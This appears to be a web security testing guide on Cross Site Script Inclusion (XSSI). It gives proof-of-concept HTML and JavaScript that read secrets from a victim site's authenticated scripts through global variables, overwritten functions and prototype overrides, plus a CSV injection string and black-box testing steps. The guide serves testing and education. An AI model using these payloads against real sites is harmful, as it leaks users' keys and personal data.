# Summary

Cross Site Script Inclusion (XSSI) vulnerability allows sensitive data leakage across-origin or cross-domain boundaries. Sensitive data could include authentication related data (login states, cookies, auth tokens, session IDs, etc.), user personal or sensitive personal data (email addresses, phone numbers, credit card details, social security numbers, etc.). XSSI is a client-side attack similar to Cross Site Request Forgery (CSRF) but they have a different purpose: CSRF uses the authenticated user context to execute certain state-changing actions inside a victim’s page (eg. transfer money to the attacker's account, modify privileges, reset password, etc.) and XSSI uses JavaScript on the client side to leak sensitive data from authenticated sessions.

By default websites are only allowed to access data if they are from the same origin. This is a key application security principle and governed by the same-origin policy (defined by RFC 6454 - [https://tools.ietf.org/html/rfc6454]). An origin is defined as the combination of URI scheme (http/https), host name, and port number. However, this policy is bypassed/not applicable for <script> HTML tag inclusions. This exception is necessary as without it websites would not be able to consume third party services, traffic analysis, or advertisement platforms, etc.

When the browser opens a website with <script> tags, the resources are fetched from the cross-origin domain and they run in the same context as the including site/browser which presents the opportunity to leak sensitive data. This is achieved in most cases using JavaScript (JS), however, the script source doesn't have to be a JS file, be served with `text/javascript` or `.js` extension. Some browsers are lenient and only block if it is served with an image type (`image/*`), a video type (`video/*`), an audio (`audio/*`) type, or `text/csv` [10].

Older browser's vulnerabilities (IE9/10) allowed data leakage via JavaScript error messages at runtime, but those vulnerabilties have now been patched by vendors and are considered less relevant. By setting the charset attribute of the <script> tag the attacker/tester can enforce UTF-16 encoding which allows data leakage for other data formats (e.g. JSON) in some cases. If you want to learn more about these please read  [Identifier based XSSI attacks MBSD Whitepaper](https://www.mbsd.jp/Whitepaper/xssi.pdf).
  
The following XSSI vulnerability cases will be discussed:

1. Leak sensitive data via global variables.
2. Leak sensitive data via global function parameters.
3. Leak sensitive data via non-JavaScript resource - CSV (Comma Separated Values) with quotations theft.
4. Leak sensitive data via JavaScript runtime errors.

## Example Leak Sensitive Data via Global Variables

1. An API key is stored in a JavaScript file with the URI `https://victim.com/internal/api.js` on the victim's website (victim.com) which is only accessible for authenticated users. The attacker/tester configures a website (attackingwebsite.com) and uses the <script> tag to refer to this JavaScript file in question.

`api.js` contents:
```javascript
(function() {
  window.secret = "supersecretUserAPIkey";
})();
```

2. The attacker/tester has configured a website (attackingwebsite.com) with the following:

`index.html` contents:
```html
<!DOCTYPE html>
<html>
  <head>
    <title>Leaking data via global variables</title>
  </head>
  <body>
    <h1>Leaking data via global variables</h1>
    <script src="https://victim.com/internal/api.js"></script>
    <div id="result">
    </div>
    <script>
      var div = document.getElementById("result");
      div.innerHTML = "Your secret data <b>" + window.secret + "</b>"; 
    </script>
  </body>
</html>
```

3. The attacker lures the user to attackingwebsite.com via social engineering, phishing emails, etc. This step requires the user to authenticate first to victim.com before visiting attackingwebsite.com.

4. The user's browser fetches api.js and the sensitive data is leaked via the global JavaScript variable and displayed using innerHTML. 

## Example Leak Sensitive Data via Global Function Parameters

This example is similar to the previous one except in this case attackingwebsite.com uses a global JavaScript function to extract the sensitive data by overwriting the victim's global JavaScript function.

`api.js` contents:
```javascript
(function() {
  var secret = "supersecretAPIkey";
  window.globalFunction(secret);
})();
```

`index.html` contents:
```html
<!DOCTYPE html>
<html>
  <head>
    <title>Leaking data via global function parameters 1</title>
  </head>
  <body>
    <div id="result">
    </div>
    <script>
      function globalFunction(param) {
        var div = document.getElementById("result");
        div.innerHTML = "Your secret data: <b>" + param + "</b>";
      }
    </script>
    <script src="https://victim.com/internal/api.js"></script>
  </body>
</html>
```

There are other XSSI vulnerabilities leaking sensitive data either via JavaScript prototype chains or global function calls. If you want to learn more about these please visit Sebastian Leike's page [4].

## Example Leak Sensitive Data via Non-Javascript Resource - CSV with Quotations Theft

To leak data the attacker/tester has to be able to inject JavaScript code into the CSV data. The following example is an excerpt from Takeshi Terada's identifier based XSSI attacks whitepaper [8]:

```
HTTP/1.1 200 OK
Content-Type: text/csv
Content-Disposition: attachment; filename="a.csv"
Content-Length: xxxx

1,"___","aaa@a.example","03-0000-0001"
2,"foo","bbb@b.example","03-0000-0002"
...
98,"bar","yyy@example.net","03-0000-0088"
99,"___","zzz@example.com","03-0000-0099"
```

In this case using the ___ parts as injection points and inserting the `\"",$$$=function(){/*` string has the following result:

```
1,"\"",$$$=function(){/*","aaa@a.example","03-0000-0001"
2,"foo","bbb@b.example","03-0000-0002"
...
98,"bar","yyy@example.net","03-0000-0088"
99,"*/}//","zzz@example.com","03-0000-0099"
```

Gmail had a similar vulnerability in 2006 that allowed the extraction of user contacts in JSON[11]. In this case the data was received from Gmail and parsed by the browser JavaScript engine using an unreferenced Array constructor to leak the data. The attacker/tester could access this Array with the sensitive data by defining and overwriting the internal Array constructor like this:

```html
<!DOCTYPE html>
<html>
  <head>
    <title>Leaking gmail contacts via JSON </title>
  </head>
  <body>
    <script>
      function Array() {
        // steal data
      }
    </script>
    <script src="http://mail.google.com/mail/?_url_scrubbed_"></script>
  </body>
</html>
```

## Example Leak Sensitive Data via Javascript Runtime Errors

Browsers normally present standardized Javascript error messages like "Script error.". However, in the case of IE9/10 runtime error messages provided additional details which could be used to leak data. For example, a website (victim.com) serves the following content at the URI http://victim.com/service/csvendpoint for authenticated users:

```
HTTP/1.1 200 OK
Content-Type: text/csv
Content-Disposition: attachment; filename="a.csv"
Content-Length: 13

1,abc,def,ghi
```

This vulnerability could be exploited with the following:

```
<!--error handler -->
<script>window.onerror = function(err) {alert(err)}</script>
<!--load target CSV -->
<script src="http://victim.com/service/csvendpoint"></script>
```

When the browser tries to render the CSV content as JavaScript it fails and leaks the sensitive data:

## How to Test
### Black Box Testing

The methodology has the following steps:
1. Identify which endpoints are responsible for sending sensitive data, what parameters are required, and identify all relevant dynamically and statically generated JavaScript responses using authenticated user sessions. Pay special attention to sensitive data sent using JSONP. To find dynamically generated JavaScript responses generate authenticated and unauthenticated requests then compare/diff them. If they're different then the response is dynamic otherwise it's static. To simplify this task a purpose built Burp proxy plugin by Veit Hailperin can be used [2]. Make sure to check other filetypes in addition to JavaScript: XSSI is not limited to JavaScript files and is much more widespread.

2. Investigate if the sensitive data can be leaked using JavaScript:
  - Using global variables [example](#example-leak-sensitive-data-via-global-variables)
  - Overwriting global functions and parameters [example](#example-leak-sensitive-data-via-global-function-parameters)
  - Using an old version of browser and exploiting JavaScript runtime error leak vulnerabilities [example](#example-leak-sensitive-data-via-javascript-runtime-errors)
  - Data leak via prototype chaining by using the "this" keyword. In JavaScript "this" is dynamically scoped which means if a function is called upon an object, `this` will point to this object even though the called function might not belong to the object itself. This behavior can be used to leak data. In the following example from Sebastian Leike's page [4] the sensitive data is stored in an Array. The tester/attacker can override Array.prototype.forEach with an attacker-controlled function. If some code calls the forEach function on an array instance that contains sensitive values, the attacker-controlled function will be invoked with "this" pointing to the object that contains the sensitive data.

`javascript.js`
```javascript
...
(function() {
  var secret = ["578a8c7c0d8f34f5", "345a8b7c9d8e34f5"];

  secret.forEach(function(element) {
    // do something here
  });  
})();
...
```

The sensitive data can be leaked with the following JavaScript code:
```javascript
...
 <div id="result">

    </div>
    <script>
      Array.prototype.forEach = function(callback) {
        var resultString = "Your secret values are: <b>";
        for (var i = 0, length = this.length; i < length; i++) {
          if (i > 0) {
            resultString += ", ";
          }
          resultString += this[i];
        }
        resultString += "</b>";
        var div = document.getElementById("result");
        div.innerHTML = resultString;
      };
    </script>
    <script src="http://victim.com/..../javascript.js"></script>
...
```
### Gray Box Testing

The methodology is similar with the exception of the attacker/tester may have access to the source code to review.
